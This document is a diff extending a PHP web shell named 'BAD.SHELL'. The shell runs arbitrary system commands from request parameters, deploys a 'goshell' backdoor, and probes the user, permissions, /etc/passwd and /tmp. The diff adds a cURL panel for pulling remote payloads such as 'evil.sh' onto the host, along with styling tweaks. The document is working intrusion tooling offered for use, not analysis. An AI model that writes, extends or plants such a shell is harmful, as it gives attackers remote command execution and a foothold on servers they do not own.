@@ -2,6 +2,7 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
     <title>BAD.SHELL</title>
 </head>
 <body>
@@ -12304,6 +12305,10 @@ $shelladdr = $_SERVER['SERVER_ADDR'];
     --BGDIM:#1A1A1A;
     --BG2: #0C0C0C;
     --TEXT: #C1C1C1;
+    --WARN: #FF9000;
+    --INFO: #3377FF;
+    --ERR: #DD2000;
+    --OK: #00A020;
 }
 
 * {
@@ -12501,6 +12506,7 @@ pre {
 #panel .tool {
     background-color: var(--BG2);
     padding: 4%;
+    margin-top: 5%;
 }
 
 #panel .tool h2 {
@@ -12508,6 +12514,27 @@ pre {
 	padding-left: 1%;
 	line-height: 3em;
 	font-weight: bold;
+}
+
+#panel .upload-url {
+	float: left;
+	width: 80%;
+}
+
+.warning {
+	color: var(--WARN);
+}
+
+.error {
+	color: var(--ERR);
+}
+
+.info {
+	color: var(--INFO);
+}
+
+.ok {
+	color: var(--OK);
 }
 
 </style>
@@ -12529,7 +12556,7 @@ pre {
 <div id="output" onclick="closePanel()">
 <?php
 
-if (!isset($_REQUEST['cmd'])) {
+if(!$_GET){
 	global $logo;
 	global $version;
 	echo "<pre>";
@@ -12548,10 +12575,26 @@ if (isset($_REQUEST['cmd'])) {
     $cmd = ($_REQUEST['cmd']);
     system($cmd,$returnvar);
     if ($returnvar != 0) {
-        echo "Command Failed\nExit Status:$returnvar";
+        echo "Command Failed\nExit Status: $returnvar";
     }
     echo "</pre>";
 }
+
+if (isset($_REQUEST['upload'])) {
+	$filename = substr(strrchr($_GET['URL'], "/"),1);
+	$ext = substr(strrchr($_GET['URL'], "."),1);
+    echo "<pre>";
+    echo "######## File Upload ########\n\n";
+    echo "Filename: $filename \n";
+    echo "Extension: $ext \n";
+    if($ext == 'php'){
+		echo "<span class='warning'>[WARNING] This extension can be compiled Server-Side by cURL and not executed as expected.\n</span>";
+		echo "<span class='info'>[INFO] Renaming the file can be fix this issue. e.g. .php > .txt \n</span>";
+	}
+    echo("\nTrying to Execute: cURL " . $_GET['URL'] . " --output $filename"."\n");
+    echo "</pre>";
+}
+
 if ($_REQUEST['deploygo'] == 'RUN') {
     function deploy(){
         $procsh = exec('pgrep goshell');
@@ -12584,8 +12627,8 @@ if ($_REQUEST['deploygo'] == 'RUN') {
         echo("PORT:" . $_REQUEST['PORT'] . "\n\n");
         echo "Initial Checks...\n";
         echo "Check write permissions.\n";
-        echo("Current User:" . exec(whoami) . "\n");
-        echo("Current Dir:" . exec(pwd) . "\n");
+        echo("Current User:" . exec('whoami') . "\n");
+        echo("Current Dir:" . exec('pwd') . "\n");
         echo("Current Perm:" . exec("stat -c '%U %G %A' ./\n") . "\n");
         echo "Attemping to write a file\n";
         $tmp = fopen("tmp", "w");
@@ -12618,7 +12661,7 @@ if ($_REQUEST['deploygo'] == 'RUN') {
 </div>
 <div id="input">
     <form method="get">
-    <input id="command" type="text" name="cmd" placeholder="Write command here and press Enter or RUN"autofocus>
+    <input id="command" type="text" name="cmd" placeholder=" Write command here and press Enter or RUN"autofocus>
     <input id="runbtn" type="submit" value="RUN">
     </form>
 </div>
@@ -12635,13 +12678,24 @@ if ($_REQUEST['deploygo'] == 'RUN') {
         <input type="submit" name="deploygo" value="RUN">
     </form>
     </div>
+    <div class="tool">
+	<h2>FILE UPLOAD [cURL]</h2>
+	<?php $curlpath = exec('which curl'); ?>
+		<pre>Upload a file to Remote Host with cURL.</br></pre>
+		<pre>cURL [path]: <span class="info-cmd"><?php echo $curlpath; ?></span></br></pre>
+		<pre>cURL [perm]: <span class="info-cmd"><?php system("stat -c '%A' $curlpath"); ?></span></br></pre>
+    <form method="get">
+		<input class="upload-url" type="text" name="URL" placeholder="e.g. http://myhost/evil.sh">
+        <input type="submit" name="upload" value="UPLOAD">
+    </form>
+    </div>
 </div>
 <div id="panel" class="panel-info">
     <h1>INFO</h1>
     <pre>Local IP [browser]: <span class="info-cmd"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></pre>
     <pre>Remote IP [shell]: <span class="info-cmd"><?php echo $_SERVER['SERVER_ADDR']; ?></span></pre>
-    <pre>Current User [whoami]: <span class="info-cmd"><?php system(whoami); ?></span></pre>
-    <pre>Current Dir [pwd]: <span class="info-cmd"><?php system(pwd); ?></span></pre>
+    <pre>Current User [whoami]: <span class="info-cmd"><?php system('whoami'); ?></span></pre>
+    <pre>Current Dir [pwd]: <span class="info-cmd"><?php system('pwd'); ?></span></pre>
     <pre>Current Dir Permissions: <span class="info-cmd"><?php system("stat -c '%U %G %A' ./"); ?></span></pre>
     <pre>/etc/passwd: <span class="info-cmd"><?php system('stat -c "%A" /etc/passwd'); ?></span></pre>
     <pre>/tmp: <span class="info-cmd"><?php system('stat -c "%A" /tmp'); ?></span></pre>
